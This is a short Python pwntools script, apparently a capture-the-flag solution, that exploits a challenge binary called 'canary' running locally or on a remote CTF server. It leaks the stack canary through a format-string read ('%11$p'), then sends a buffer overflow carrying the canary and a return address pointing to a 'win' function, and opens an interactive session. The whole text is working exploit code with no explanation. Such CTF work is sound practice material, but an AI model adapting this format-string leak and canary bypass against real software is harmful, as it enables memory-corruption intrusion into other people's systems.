#!/usr/bin/env python3

from pwn import *

exe = ELF("./canary_patched")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("canary.challs.havce.it", 1341)

    return r


def main():
    r = conn()

    pause()

    r.sendlineafter(b"? ", b"%11$p")
    
    canary = int(r.recvline()[26 : -1].decode(), 16)
    
    print("indirizzo del canary = " + str(canary))
    
    #indirizzo for win = 0x40073b
    
    r.sendline(b"A" * 40 + canary.to_bytes(8, "little") + b"B" * 8 + p64(0x40073b))
    
    r.interactive()


if __name__ == "__main__":
    main()
